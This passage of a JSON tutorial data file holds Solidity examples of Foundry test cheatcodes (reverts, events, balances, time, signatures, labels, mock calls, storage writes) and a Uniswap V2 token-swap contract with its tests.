        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract Error {\n    error NotAuthorized();\n\n    function throwError() external {\n        require(false, \"not authorized\");\n    }\n\n    function throwCustomError() external {\n        revert NotAuthorized();\n    }\n}\n\ncontract ErrorTest is Test {\n    Error public err;\n\n    function setUp() public {\n        err = new Error();\n    }\n\n    // Start test name with testFail\n    function testFail() public {\n        err.throwError();\n    }\n\n    function testRevert() public {\n        vm.expectRevert();\n        err.throwError();\n    }\n\n    function testRequireMessage() public {\n        vm.expectRevert(bytes(\"not authorized\"));\n        err.throwError();\n    }\n\n    function testCustomError() public {\n        vm.expectRevert(Error.NotAuthorized.selector);\n        err.throwCustomError();\n    }\n\n    // Add label to assertions\n    function testErrorLabel() public {\n        assertEq(uint256(1), uint256(1), \"test 1\");\n        assertEq(uint256(1), uint256(1), \"test 2\");\n        assertEq(uint256(1), uint256(1), \"test 3\");\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "error"
    ],
    "order": 2
  },
  {
    "slug": "event",
    "title": "Foundry Event",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry event",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract Event {\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    function transfer(address from, address to, uint256 amount) external {\n        emit Transfer(from, to, amount);\n    }\n\n    function transferMany(\n        address from,\n        address[] calldata to,\n        uint256[] calldata amounts\n    ) external {\n        for (uint256 i = 0; i < to.length; i++) {\n            emit Transfer(from, to[i], amounts[i]);\n        }\n    }\n}\n\ncontract EventTest is Test {\n    Event public e;\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    function setUp() public {\n        e = new Event();\n    }\n\n    function testEmitTransferEvent() public {\n        // function expectEmit(\n        //     bool checkTopic1,\n        //     bool checkTopic2,\n        //     bool checkTopic3,\n        //     bool checkData\n        // ) external;\n\n        // 1. Tell Foundry which data to check\n        // Check index 1, index 2 and data\n        vm.expectEmit(true, true, false, true);\n        // 2. Emit the expected event\n        emit Transfer(address(this), address(123), 456);\n        // 3. Call the function that should emit the event\n        e.transfer(address(this), address(123), 456);\n\n        // Check only index 1\n        vm.expectEmit(true, false, false, false);\n        emit Transfer(address(this), address(123), 456);\n        // NOTE: index 2 and data (amount) doesn't match\n        //       but the test will still pass\n        e.transfer(address(this), address(111), 222);\n    }\n\n    function testEmitManyTransferEvent() public {\n        address[] memory to = new address[](2);\n        to[0] = address(111);\n        to[1] = address(222);\n\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 1;\n        amounts[1] = 2;\n\n        for (uint256 i = 0; i < to.length; i++) {\n            // 1. Tell Foundry which data to check\n            vm.expectEmit(true, true, false, true);\n            // 2. Emit the expected event\n            emit Transfer(address(this), to[i], amounts[i]);\n        }\n\n        // 3. Call the function that should emit the event\n        e.transferMany(address(this), to, amounts);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "EventTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract Event {\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    function transfer(address from, address to, uint256 amount) external {\n        emit Transfer(from, to, amount);\n    }\n\n    function transferMany(\n        address from,\n        address[] calldata to,\n        uint256[] calldata amounts\n    ) external {\n        for (uint256 i = 0; i < to.length; i++) {\n            emit Transfer(from, to[i], amounts[i]);\n        }\n    }\n}\n\ncontract EventTest is Test {\n    Event public e;\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    function setUp() public {\n        e = new Event();\n    }\n\n    function testEmitTransferEvent() public {\n        // function expectEmit(\n        //     bool checkTopic1,\n        //     bool checkTopic2,\n        //     bool checkTopic3,\n        //     bool checkData\n        // ) external;\n\n        // 1. Tell Foundry which data to check\n        // Check index 1, index 2 and data\n        vm.expectEmit(true, true, false, true);\n        // 2. Emit the expected event\n        emit Transfer(address(this), address(123), 456);\n        // 3. Call the function that should emit the event\n        e.transfer(address(this), address(123), 456);\n\n        // Check only index 1\n        vm.expectEmit(true, false, false, false);\n        emit Transfer(address(this), address(123), 456);\n        // NOTE: index 2 and data (amount) doesn't match\n        //       but the test will still pass\n        e.transfer(address(this), address(111), 222);\n    }\n\n    function testEmitManyTransferEvent() public {\n        address[] memory to = new address[](2);\n        to[0] = address(111);\n        to[1] = address(222);\n\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 1;\n        amounts[1] = 2;\n\n        for (uint256 i = 0; i < to.length; i++) {\n            // 1. Tell Foundry which data to check\n            vm.expectEmit(true, true, false, true);\n            // 2. Emit the expected event\n            emit Transfer(address(this), to[i], amounts[i]);\n        }\n\n        // 3. Call the function that should emit the event\n        e.transferMany(address(this), to, amounts);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "event"
    ],
    "order": 3
  },
  {
    "slug": "send",
    "title": "Foundry Send",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry send",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\n// Examples of deal and hoax\n// deal(address, uint) - Set ETH balance of address\n// deal(address, address, uint256) - Sets ERC20 token balance (works for most tokens)\n// hoax(address, uint) - deal + prank\n\ncontract ERC20 {\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n}\n\ncontract SendTest is Test {\n    ERC20 token = new ERC20();\n\n    function testSendEth() public {\n        // Set ETH balance\n        deal(address(1), 100);\n        assertEq(address(1).balance, 100);\n\n        // Set ERC20 balance\n        deal(address(token), address(1), 10);\n        assertEq(token.balanceOf(address(1)), 10);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "SendTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\n// Examples of deal and hoax\n// deal(address, uint) - Set ETH balance of address\n// deal(address, address, uint256) - Sets ERC20 token balance (works for most tokens)\n// hoax(address, uint) - deal + prank\n\ncontract ERC20 {\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n}\n\ncontract SendTest is Test {\n    ERC20 token = new ERC20();\n\n    function testSendEth() public {\n        // Set ETH balance\n        deal(address(1), 100);\n        assertEq(address(1).balance, 100);\n\n        // Set ERC20 balance\n        deal(address(token), address(1), 10);\n        assertEq(token.balanceOf(address(1)), 10);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "send",
      "deal",
      "hoax"
    ],
    "order": 4
  },
  {
    "slug": "time",
    "title": "Foundry Time",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry time",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract TimeTest is Test {\n    // vm.warp - set block.timestamp to future timestamp\n    // vm.roll - set block.number\n    // skip - increment current timestamp\n    // rewind - decrement current timestamp\n\n    function test() public {\n        console.log(\"timestamp\", block.timestamp);\n        console.log(\"block number\", block.number);\n\n        console.log(\"warp\");\n        vm.warp(block.timestamp + 10);\n        console.log(\"timestamp\", block.timestamp);\n\n        console.log(\"skip\");\n        skip(10);\n        console.log(\"timestamp\", block.timestamp);\n\n        console.log(\"roll\");\n        vm.roll(10);\n        console.log(\"block number\", block.number);\n\n        console.log(\"rewind\");\n        rewind(10);\n        console.log(\"timestamp\", block.timestamp);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "TimeTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract TimeTest is Test {\n    // vm.warp - set block.timestamp to future timestamp\n    // vm.roll - set block.number\n    // skip - increment current timestamp\n    // rewind - decrement current timestamp\n\n    function test() public {\n        console.log(\"timestamp\", block.timestamp);\n        console.log(\"block number\", block.number);\n\n        console.log(\"warp\");\n        vm.warp(block.timestamp + 10);\n        console.log(\"timestamp\", block.timestamp);\n\n        console.log(\"skip\");\n        skip(10);\n        console.log(\"timestamp\", block.timestamp);\n\n        console.log(\"roll\");\n        vm.roll(10);\n        console.log(\"block number\", block.number);\n\n        console.log(\"rewind\");\n        rewind(10);\n        console.log(\"timestamp\", block.timestamp);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "time",
      "warp",
      "skip",
      "roll",
      "unwind"
    ],
    "order": 5
  },
  {
    "slug": "sign",
    "title": "Foundry Sign",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry sign",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract SignTest is Test {\n    // private key = 123\n    // public key = vm.addr(private key)\n    // message = \"secret message\"\n    // message hash = keccak256(message)\n    // vm.sign(private key, message hash)\n    function testSignature() public {\n        uint256 privateKey = 123;\n        // Computes the address for a given private key.\n        address alice = vm.addr(privateKey);\n\n        // Test valid signature\n        bytes32 messageHash = keccak256(\"Signed by Alice\");\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, messageHash);\n        address signer = ecrecover(messageHash, v, r, s);\n\n        assertEq(signer, alice);\n\n        // Test invalid message\n        bytes32 invalidHash = keccak256(\"Not signed by Alice\");\n        signer = ecrecover(invalidHash, v, r, s);\n\n        assertTrue(signer != alice);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "SignTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract SignTest is Test {\n    // private key = 123\n    // public key = vm.addr(private key)\n    // message = \"secret message\"\n    // message hash = keccak256(message)\n    // vm.sign(private key, message hash)\n    function testSignature() public {\n        uint256 privateKey = 123;\n        // Computes the address for a given private key.\n        address alice = vm.addr(privateKey);\n\n        // Test valid signature\n        bytes32 messageHash = keccak256(\"Signed by Alice\");\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, messageHash);\n        address signer = ecrecover(messageHash, v, r, s);\n\n        assertEq(signer, alice);\n\n        // Test invalid message\n        bytes32 invalidHash = keccak256(\"Not signed by Alice\");\n        signer = ecrecover(invalidHash, v, r, s);\n\n        assertTrue(signer != alice);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "sign",
      "signature",
      "ecrecover"
    ],
    "order": 6
  },
  {
    "slug": "label",
    "title": "Foundry Label",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry label",
    "content": "Use `vm.label` to put a label on contracts\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ncontract LabelTest is Test {\n    IERC20 weth;\n\n    function setUp() public {\n        weth = IERC20(WETH);\n        // Label address with \"WETH\", this will be displayed in stack traces\n        vm.label(WETH, \"WETH\");\n    }\n\n    function test() public {\n        console.log(\"%e\", weth.balanceOf(address(this)));\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "LabelTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ncontract LabelTest is Test {\n    IERC20 weth;\n\n    function setUp() public {\n        weth = IERC20(WETH);\n        // Label address with \"WETH\", this will be displayed in stack traces\n        vm.label(WETH, \"WETH\");\n    }\n\n    function test() public {\n        console.log(\"%e\", weth.balanceOf(address(this)));\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "label"
    ],
    "order": 7
  },
  {
    "slug": "mock-call",
    "title": "Foundry Mock Call",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry mock call",
    "content": "Set return values from a function call with `mockCall`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract Target {\n    function f(uint256 x, uint256 y) external view returns (uint256) {\n        return g();\n    }\n\n    function g() internal view returns (uint256) {\n        return 1;\n    }\n}\n\ncontract MockCallTest is Test {\n    Target target;\n\n    function setUp() public {\n        target = new Target();\n    }\n\n    function test() public {\n        uint256 x = 1;\n        uint256 y = 1;\n        vm.mockCall(\n            address(target),\n            abi.encodeCall(Target.f, (x, y)),\n            abi.encode(uint256(99))\n        );\n\n        // Returns 99\n        uint256 res = target.f(x, y);\n        console.log(\"res\", res);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "MockCallTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract Target {\n    function f(uint256 x, uint256 y) external view returns (uint256) {\n        return g();\n    }\n\n    function g() internal view returns (uint256) {\n        return 1;\n    }\n}\n\ncontract MockCallTest is Test {\n    Target target;\n\n    function setUp() public {\n        target = new Target();\n    }\n\n    function test() public {\n        uint256 x = 1;\n        uint256 y = 1;\n        vm.mockCall(\n            address(target),\n            abi.encodeCall(Target.f, (x, y)),\n            abi.encode(uint256(99))\n        );\n\n        // Returns 99\n        uint256 res = target.f(x, y);\n        console.log(\"res\", res);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "mock",
      "call"
    ],
    "order": 8
  },
  {
    "slug": "vm-store",
    "title": "Foundry vm.store",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Learn how to use vm.store to write directly to storage slots in Foundry tests",
    "content": "Use `vm.store` to write directly to a contract's storage slots during testing.\n\nThis is useful for:\n\n- Setting up test scenarios without calling contract functions\n- Bypassing access controls to test specific states\n- Testing edge cases that are hard to reach normally\n\nFor mappings, calculate the slot with `keccak256(abi.encode(key, mappingSlot))`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\n\ncontract Vault {\n    // Slot 0\n    address public owner;\n    // Slot 1\n    uint256 public password;\n    // Slot 2\n    mapping(address => uint256) public balances;\n\n    constructor(uint256 _password) {\n        owner = msg.sender;\n        password = _password;\n    }\n\n    function withdraw() external {\n        require(msg.sender == owner, \"not owner\");\n        uint256 bal = balances[msg.sender];\n        balances[msg.sender] = 0;\n        payable(msg.sender).transfer(bal);\n    }\n}\n\ncontract StoreTest is Test {\n    Vault vault;\n\n    function setUp() public {\n        vault = new Vault(12345);\n    }\n\n    // vm.store(address account, bytes32 slot, bytes32 value)\n    // - account: Address of the contract\n    // - slot: Storage slot to write to\n    // - value: Value to write\n\n    function test_store_simple_slot() public {\n        // Slot 0 stores the owner address\n        // Change owner to address(1)\n        vm.store(address(vault), bytes32(uint256(0)), bytes32(uint256(uint160(address(1)))));\n        assertEq(vault.owner(), address(1));\n\n        // Slot 1 stores the password\n        // Change password to 999\n        vm.store(address(vault), bytes32(uint256(1)), bytes32(uint256(999)));\n        assertEq(vault.password(), 999);\n    }\n\n    function test_store_mapping() public {\n        // For mappings, the slot is calculated as:\n        // keccak256(abi.encode(key, mapping_slot))\n\n        address user = address(0xBEEF);\n        uint256 mappingSlot = 2; // balances is at slot 2\n\n        // Calculate the storage slot for balances[user]\n        bytes32 slot = keccak256(abi.encode(user, mappingSlot));\n\n        // Set balance of user to 100 ether\n        vm.store(address(vault), slot, bytes32(uint256(100 ether)));\n\n        assertEq(vault.balances(user), 100 ether);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "StoreTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\n\ncontract Vault {\n    // Slot 0\n    address public owner;\n    // Slot 1\n    uint256 public password;\n    // Slot 2\n    mapping(address => uint256) public balances;\n\n    constructor(uint256 _password) {\n        owner = msg.sender;\n        password = _password;\n    }\n\n    function withdraw() external {\n        require(msg.sender == owner, \"not owner\");\n        uint256 bal = balances[msg.sender];\n        balances[msg.sender] = 0;\n        payable(msg.sender).transfer(bal);\n    }\n}\n\ncontract StoreTest is Test {\n    Vault vault;\n\n    function setUp() public {\n        vault = new Vault(12345);\n    }\n\n    // vm.store(address account, bytes32 slot, bytes32 value)\n    // - account: Address of the contract\n    // - slot: Storage slot to write to\n    // - value: Value to write\n\n    function test_store_simple_slot() public {\n        // Slot 0 stores the owner address\n        // Change owner to address(1)\n        vm.store(address(vault), bytes32(uint256(0)), bytes32(uint256(uint160(address(1)))));\n        assertEq(vault.owner(), address(1));\n\n        // Slot 1 stores the password\n        // Change password to 999\n        vm.store(address(vault), bytes32(uint256(1)), bytes32(uint256(999)));\n        assertEq(vault.password(), 999);\n    }\n\n    function test_store_mapping() public {\n        // For mappings, the slot is calculated as:\n        // keccak256(abi.encode(key, mapping_slot))\n\n        address user = address(0xBEEF);\n        uint256 mappingSlot = 2; // balances is at slot 2\n\n        // Calculate the storage slot for balances[user]\n        bytes32 slot = keccak256(abi.encode(user, mappingSlot));\n\n        // Set balance of user to 100 ether\n        vm.store(address(vault), slot, bytes32(uint256(100 ether)));\n\n        assertEq(vault.balances(user), 100 ether);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "vm.store",
      "storage",
      "cheatcode",
      "testing"
    ],
    "order": 9
  },
  {
    "slug": "uniswap-v2",
    "title": "Uniswap V2 Swap",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Uniswap V2 swap",
    "content": "`swapExactTokensForTokens` sells all tokens for another.\n\n`swapTokensForExactTokens` buys specific amount of tokens set by the caller.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UniswapV2SwapExamples {\n    address private constant UNISWAP_V2_ROUTER =\n        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    IUniswapV2Router private router = IUniswapV2Router(UNISWAP_V2_ROUTER);\n    IERC20 private weth = IERC20(WETH);\n    IERC20 private dai = IERC20(DAI);\n\n    // Swap WETH to DAI\n    function swapSingleHopExactAmountIn(uint256 amountIn, uint256 amountOutMin)\n        external\n        returns (uint256 amountOut)\n    {\n        weth.transferFrom(msg.sender, address(this), amountIn);\n        weth.approve(address(router), amountIn);\n\n        address[] memory path;\n        path = new address[](2);\n        path[0] = WETH;\n        path[1] = DAI;\n\n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            amountIn, amountOutMin, path, msg.sender, block.timestamp\n        );\n\n        // amounts[0] = WETH amount, amounts[1] = DAI amount\n        return amounts[1];\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function swapMultiHopExactAmountIn(uint256 amountIn, uint256 amountOutMin)\n        external\n        returns (uint256 amountOut)\n    {\n        dai.transferFrom(msg.sender, address(this), amountIn);\n        dai.approve(address(router), amountIn);\n\n        address[] memory path;\n        path = new address[](3);\n        path[0] = DAI;\n        path[1] = WETH;\n        path[2] = USDC;\n\n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            amountIn, amountOutMin, path, msg.sender, block.timestamp\n        );\n\n        // amounts[0] = DAI amount\n        // amounts[1] = WETH amount\n        // amounts[2] = USDC amount\n        return amounts[2];\n    }\n\n    // Swap WETH to DAI\n    function swapSingleHopExactAmountOut(\n        uint256 amountOutDesired,\n        uint256 amountInMax\n    ) external returns (uint256 amountOut) {\n        weth.transferFrom(msg.sender, address(this), amountInMax);\n        weth.approve(address(router), amountInMax);\n\n        address[] memory path;\n        path = new address[](2);\n        path[0] = WETH;\n        path[1] = DAI;\n\n        uint256[] memory amounts = router.swapTokensForExactTokens(\n            amountOutDesired, amountInMax, path, msg.sender, block.timestamp\n        );\n\n        // Refund WETH to msg.sender\n        if (amounts[0] < amountInMax) {\n            weth.transfer(msg.sender, amountInMax - amounts[0]);\n        }\n\n        return amounts[1];\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function swapMultiHopExactAmountOut(\n        uint256 amountOutDesired,\n        uint256 amountInMax\n    ) external returns (uint256 amountOut) {\n        dai.transferFrom(msg.sender, address(this), amountInMax);\n        dai.approve(address(router), amountInMax);\n\n        address[] memory path;\n        path = new address[](3);\n        path[0] = DAI;\n        path[1] = WETH;\n        path[2] = USDC;\n\n        uint256[] memory amounts = router.swapTokensForExactTokens(\n            amountOutDesired, amountInMax, path, msg.sender, block.timestamp\n        );\n\n        // Refund DAI to msg.sender\n        if (amounts[0] < amountInMax) {\n            dai.transfer(msg.sender, amountInMax - amounts[0]);\n        }\n\n        return amounts[2];\n    }\n}\n\ninterface IUniswapV2Router {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\n```\n\n### Test with Foundry\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {\n    UniswapV2SwapExamples,\n    IERC20,\n    IWETH\n} from \"../../../src/defi/uniswap-v2/UniswapV2SwapExamples.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\ncontract UniswapV2SwapExamplesTest is Test {\n    IWETH private weth = IWETH(WETH);\n    IERC20 private dai = IERC20(DAI);\n    IERC20 private usdc = IERC20(USDC);\n\n    UniswapV2SwapExamples private uni = new UniswapV2SwapExamples();\n\n    function setUp() public {}\n\n    // Swap WETH -> DAI\n    function testSwapSingleHopExactAmountIn() public {\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        uint256 daiAmountMin = 1;\n        uint256 daiAmountOut =\n            uni.swapSingleHopExactAmountIn(wethAmount, daiAmountMin);\n\n        console2.log(\"DAI\", daiAmountOut);\n        assertGe(daiAmountOut, daiAmountMin, \"amount out < min\");\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function testSwapMultiHopExactAmountIn() public {\n        // Swap WETH -> DAI\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        uint256 daiAmountMin = 1;\n        uni.swapSingleHopExactAmountIn(wethAmount, daiAmountMin);\n\n        // Swap DAI -> WETH -> USDC\n        uint256 daiAmountIn = 1e18;\n        dai.approve(address(uni), daiAmountIn);\n\n        uint256 usdcAmountOutMin = 1;\n        uint256 usdcAmountOut =\n            uni.swapMultiHopExactAmountIn(daiAmountIn, usdcAmountOutMin);\n\n        console2.log(\"USDC\", usdcAmountOut);\n        assertGe(usdcAmountOut, usdcAmountOutMin, \"amount out < min\");\n    }\n\n    // Swap WETH -> DAI\n    function testSwapSingleHopExactAmountOut() public {\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        uint256 daiAmountDesired = 1e18;\n        uint256 daiAmountOut =\n            uni.swapSingleHopExactAmountOut(daiAmountDesired, wethAmount);\n\n        console2.log(\"DAI\", daiAmountOut);\n        assertEq(\n            daiAmountOut, daiAmountDesired, \"amount out != amount out desired\"\n        );\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function testSwapMultiHopExactAmountOut() public {\n        // Swap WETH -> DAI\n        uint256 wethAmount = 1e18;\n        weth.deposit{value: wethAmount}();\n        weth.approve(address(uni), wethAmount);\n\n        // Buy 100 DAI\n        uint256 daiAmountOut = 100 * 1e18;\n        uni.swapSingleHopExactAmountOut(daiAmountOut, wethAmount);\n\n        // Swap DAI -> WETH -> USDC\n        dai.approve(address(uni), daiAmountOut);\n\n        uint256 amountOutDesired = 1e6;\n        uint256 amountOut =\n            uni.swapMultiHopExactAmountOut(amountOutDesired, daiAmountOut);\n\n        console2.log(\"USDC\", amountOut);\n        assertEq(\n            amountOut, amountOutDesired, \"amount out != amount out desired\"\n        );\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "UniswapV2SwapExamples.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UniswapV2SwapExamples {\n    address private constant UNISWAP_V2_ROUTER =\n        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n\n    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    IUniswapV2Router private router = IUniswapV2Router(UNISWAP_V2_ROUTER);\n    IERC20 private weth = IERC20(WETH);\n    IERC20 private dai = IERC20(DAI);\n\n    // Swap WETH to DAI\n    function swapSingleHopExactAmountIn(uint256 amountIn, uint256 amountOutMin)\n        external\n        returns (uint256 amountOut)\n    {\n        weth.transferFrom(msg.sender, address(this), amountIn);\n        weth.approve(address(router), amountIn);\n\n        address[] memory path;\n        path = new address[](2);\n        path[0] = WETH;\n        path[1] = DAI;\n\n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            amountIn, amountOutMin, path, msg.sender, block.timestamp\n        );\n\n        // amounts[0] = WETH amount, amounts[1] = DAI amount\n        return amounts[1];\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function swapMultiHopExactAmountIn(uint256 amountIn, uint256 amountOutMin)\n        external\n        returns (uint256 amountOut)\n    {\n        dai.transferFrom(msg.sender, address(this), amountIn);\n        dai.approve(address(router), amountIn);\n\n        address[] memory path;\n        path = new address[](3);\n        path[0] = DAI;\n        path[1] = WETH;\n        path[2] = USDC;\n\n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            amountIn, amountOutMin, path, msg.sender, block.timestamp\n        );\n\n        // amounts[0] = DAI amount\n        // amounts[1] = WETH amount\n        // amounts[2] = USDC amount\n        return amounts[2];\n    }\n\n    // Swap WETH to DAI\n    function swapSingleHopExactAmountOut(\n        uint256 amountOutDesired,\n        uint256 amountInMax\n    ) external returns (uint256 amountOut) {\n        weth.transferFrom(msg.sender, address(this), amountInMax);\n        weth.approve(address(router), amountInMax);\n\n        address[] memory path;\n        path = new address[](2);\n        path[0] = WETH;\n        path[1] = DAI;\n\n        uint256[] memory amounts = router.swapTokensForExactTokens(\n            amountOutDesired, amountInMax, path, msg.sender, block.timestamp\n        );\n\n        // Refund WETH to msg.sender\n        if (amounts[0] < amountInMax) {\n            weth.transfer(msg.sender, amountInMax - amounts[0]);\n        }\n\n        return amounts[1];\n    }\n\n    // Swap DAI -> WETH -> USDC\n    function swapMultiHopExactAmountOut(\n        uint256 amountOutDesired,\n        uint256 amountInMax\n    ) external returns (uint256 amountOut) {\n        dai.transferFrom(msg.sender, address(this), amountInMax);\n        dai.approve(address(router), amountInMax);\n\n        address[] memory path;\n        path = new address[](3);\n        path[0] = DAI;\n        path[1] = WETH;\n        path[2] = USDC;\n\n        uint256[] memory amounts = router.swapTokensForExactTokens(\n            amountOutDesired, amountInMax, path, msg.sender, block.timestamp\n        );\n\n        // Refund DAI to msg.sender\n        if (amounts[0] < amountInMax) {\n            dai.transfer(msg.sender, amountInMax - amounts[0]);\n        }\n\n        return amounts[2];\n    }\n}\n\ninterface IUniswapV2Router {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n"
      },
      {
        "fileName": "UniswapV2SwapExamplesTest.sol",
